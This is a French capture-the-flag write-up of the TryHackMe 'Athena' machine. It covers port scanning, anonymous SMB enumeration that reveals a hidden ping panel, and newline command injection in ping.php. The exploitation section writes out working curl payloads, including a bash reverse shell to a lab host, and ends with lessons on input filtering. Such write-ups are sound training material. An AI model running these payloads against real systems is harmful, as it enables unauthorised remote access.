# THM — Athena · Linux · Medium

**IP :** `10.130.140.166` &nbsp;|&nbsp; **Date :** 28 Mai 2026 &nbsp;|&nbsp; **Outils :** nmap · feroxbuster · nuclei · nikto · smbclient · curl

---

## Contexte

> Athena est une machine Linux de difficulté **Medium** sur TryHackMe. La surface d'attaque combine un partage SMB anonyme qui révèle un chemin caché, et une application PHP de ping vulnérable à une **injection de commande OS** via saut de ligne (`%0A`). L'accès initial donne un shell en tant que `www-data`.

---

## Reconnaissance

### Scan de ports

```bash
nmap -sC -sV -A -p- 10.130.140.166
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu-4ubuntu0.5
80/tcp  open  http        Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

NetBIOS hostname : `ROUTERPANEL` — indice sur la nature de l'application web.

### Scan passif

```bash
nuclei -u 10.130.140.166
nikto -h 10.130.140.166
```

Résultats notables :

- `[CVE-2023-48795]` — SSH vulnérable à Terrapin (medium, non exploité ici)
- `[smb-signing]` — SMB signing désactivé
- Apache/2.4.41 outdated, en-têtes de sécurité absents

### Fuzzing web

```bash
feroxbuster -u http://10.130.140.166
```

```
200  /          Page d'accueil — thème "Athena - Gods of olympus"
200  /style.css
200  /athena.jpg
```

Peu de résultats. Le chemin intéressant ne sera pas trouvé par fuzzing — il est révélé par le SMB.

---

## Énumération SMB

### Listing des partages (null session)

```bash
smbclient --no-pass -L //10.130.140.166
```

```
Sharename    Type    Comment
---------    ----    -------
public       Disk
IPC$         IPC     IPC Service (Samba 4.15.13-Ubuntu)
```

Le partage `public` est accessible anonymement.

### Contenu du partage

```bash
smbclient --no-pass //10.130.140.166/public
smb: \> ls
smb: \> get msg_for_administrator.txt
```

```
Dear Administrator,

I would like to inform you that a new Ping system is being developed
and I left the corresponding application in a specific path, which can
be accessed through the following address: /myrouterpanel

Yours sincerely,
Athena — Intern
```

Le chemin `/myrouterpanel` n'est pas indexé et n'aurait pas été trouvé par feroxbuster. Le fichier SMB est le vrai point d'entrée.

---

## Exploitation — Command Injection dans ping.php

### Identification de la cible

L'endpoint `/myrouterpanel/ping.php` expose un formulaire qui exécute une commande `ping` côté serveur à partir du paramètre `ip`.

### Test d'injection par saut de ligne

Le filtre éventuel porte sur les caractères comme `;` ou `|`, mais pas sur `%0A` (newline URL-encodé). En injectant un newline dans le paramètre `ip`, on peut enchaîner une seconde commande :

```bash
curl -s -X POST http://10.130.140.166/myrouterpanel/ping.php \
  -d "ip=127.0.0.1%0Aid"
```

La commande `id` s'exécute à la suite du ping. Le résultat confirme l'exécution en tant que `www-data`.

### Reverse shell

On met en place un listener :

```bash
nc -lvnp 4444
```

Puis on envoie le payload :

```bash
curl -s -X POST http://10.130.140.166/myrouterpanel/ping.php \
  --data-urlencode "ip=127.0.0.1
bash -c 'bash -i >& /dev/tcp/10.128.142.213/4444 0>&1'"
```

Shell obtenu en tant que `www-data`.

### Stabilisation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows $(tput lines) columns $(tput cols)
```

### Flag utilisateur

```bash
cat /home/*/user.txt
# THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

---

## Escalade de privilèges

> ⚠️ Cette partie n'a pas été complétée lors de cette session. La section sera mise à jour.

Pistes à explorer :

- `sudo -l` — vérifier les droits sudo de `www-data`
- SUID/SGID : `find / -perm -4000 2>/dev/null`
- Cronjobs : `cat /etc/crontab` et `/var/spool/cron/`
- Capabilities : `getcap -r / 2>/dev/null`
- Services internes : `ss -lntp`

---

## Chaîne d'attaque

| Phase | Technique | Outil | Détail |
|---|---|---|---|
| Reconnaissance | Port scan | nmap | SSH, HTTP, SMB |
| Énumération | Null session SMB | smbclient | Partage `public` accessible anonymement |
| Pivot | Fichier SMB | — | `/myrouterpanel` révélé dans `msg_for_administrator.txt` |
| Exploitation | OS Command Injection (newline `%0A`) | curl | `ping.php` — injection via saut de ligne |
| Accès | Reverse shell | netcat | Shell `www-data` |

---

## Ce que j'ai retenu

**Le SMB est souvent sous-estimé.** Un partage anonyme contenant un fichier texte a révélé le chemin de l'application vulnérable — introuvable par fuzzing classique.

**Les filtres sur `;` et `|` ne suffisent pas.** Le saut de ligne (`%0A`) est un vecteur d'injection fréquemment oublié dans les implémentations maison de commandes shell. Toute entrée utilisateur passée à `exec()`, `system()` ou `shell_exec()` doit être traitée comme dangereuse quelle que soit la méthode de filtrage.

**Toujours lire les fichiers trouvés intégralement.** La note d'Athena à l'administrateur était la clé de la machine entière.

---

## Ressources

- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [HackTricks — SMB Null Session](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#null-session)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [CVE-2023-48795 — Terrapin SSH](https://nvd.nist.gov/vuln/detail/CVE-2023-48795)
